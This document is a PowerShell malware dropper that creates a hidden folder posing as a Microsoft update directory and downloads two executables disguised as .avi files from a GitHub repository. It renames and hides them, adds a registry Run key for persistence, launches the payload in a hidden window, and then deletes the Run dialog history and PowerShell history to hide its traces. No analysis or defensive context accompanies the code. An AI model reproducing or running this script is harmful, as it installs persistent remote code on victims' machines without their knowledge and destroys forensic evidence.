## Create directory
$ErrorActionPreference = 'SilentlyContinue'
$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
if (-not (Test-Path -Path $MsRdpNetPath)) {
    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
    $MsRdpNetFolder.Attributes += "Hidden"
}

# Copy Agent
$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\DocUp.exe"
$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/RegUpdate.avi"
if (-not (Test-Path $rutaLocalAgent)) {
    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
}
if ((Get-Item $rutaLocalAgent).Name -ne "DocUp.exe") {
    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'DocUp.exe'
    Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
}
$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent

# Copy Runer
$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe"
$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mssucn.avi"
if (-not (Test-Path $rutaLocalRuner)) {
    Invoke-WebRequest -Uri $urlRemotoRuner -OutFile $rutaLocalRuner
}
if ((Get-Item $rutaLocalRuner).Name -ne "Mssucn.exe") {
    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'Mssucn.avi', 'Mssucn.exe'
    Rename-Item -Path $rutaLocalRuner -NewName $rutaNuevoNombreRuner
}
$atributosOcultosRuner = (Get-Item $rutaLocalRuner).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalRuner -Name Attributes -Value $atributosOcultosRuner
sleep 10

# Registry path for the startup entries
$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$nombreEntrada = "MsUpdate"
if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe"
    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
}
sleep 10

## Execution of the client
Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe" -WindowStyle Hidden

sleep 30
# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force

# Limpiar historial Powershell
Clear-History
Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
exit
